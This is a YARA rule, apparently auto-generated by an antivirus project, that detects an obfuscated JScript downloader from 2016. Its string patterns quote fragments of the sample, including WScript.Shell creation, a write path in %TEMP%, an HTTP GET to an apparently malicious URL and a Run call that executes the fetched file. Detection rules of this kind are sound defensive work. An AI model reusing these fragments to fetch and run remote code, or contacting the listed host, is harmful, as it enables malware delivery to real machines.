rule sig_20160427_b185cf562f1194cca264992fde29dd37 {
  meta:
    description = "datamaliciousorder - file 20160427_b185cf562f1194cca264992fde29dd37.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e57393d6ef4c9504099c3a2ece4b7520637e4932a8cf3c70f2b51ef1c5ac2bbb"

  strings:
    $s1  = "function AbugmXzoyk() {return BagumBdrof[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"cePd3Ie" ascii
    $s2  = "function AbugmXzoyk() {return BagumBdrof[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"cePd3Ie" ascii
    $s3  = "var BagumBdrof = function FphngEyahi() {return FydxgYeqpv[UvikfQlfdy](\"WScript\"+\".Shell\");}(), RjyjzVrjkd = 11;" fullword ascii
    $s4  = "CduhrMkepu[WsuvdEjjok](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s5  = "var FydxgYeqpv = this[\"WScript\"];" fullword ascii
    $s6  = "function WlzgdGrnro(BmqvcAfzkd, FfbxdRqfau){HkuqpHeyyl = HkuqpHeyyl * 1; return BmqvcAfzkd - FfbxdRqfau;};" fullword ascii
    $s7  = "if (CduhrMkepu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function ZibutVvzjn(){return CuaghIngpp + \"\";};" fullword ascii
    $s9  = "function QnjmuXtvoy() {return ((NmttxUaakd == true) && (NmttxUaakd == OyhzlTxjpy)) ? 1 : HkuqpHeyyl;};" fullword ascii
    $s10 = "function RxlvxEygnd(RifjhYwkzq) {var CihdsRrfdh = (1, 2, 3, 4, 5, RifjhYwkzq); return CihdsRrfdh;};" fullword ascii
    $s11 = "var OyhzlTxjpy = false;" fullword ascii
    $s12 = "function LvguuNyffi(GnvbhJgopi){BagumBdrof[\"R\"+\"un\"](GnvbhJgopi, HkuqpHeyyl, HkuqpHeyyl);};" fullword ascii
    $s13 = "NmttxUaakd = true; " fullword ascii
    $s14 = "MnhvwEysym = true;" fullword ascii
    $s15 = "var NmttxUaakd = false;" fullword ascii
    $s16 = "function PtdsgHplew()" fullword ascii
    $s17 = "}while (IzhqfVegsc);" fullword ascii
    $s18 = "OyhzlTxjpy = true; " fullword ascii
    $s19 = "var TrxvuRvbaa = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "return WlzgdGrnro(SznqlVfkjq, RwuknLklyo);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}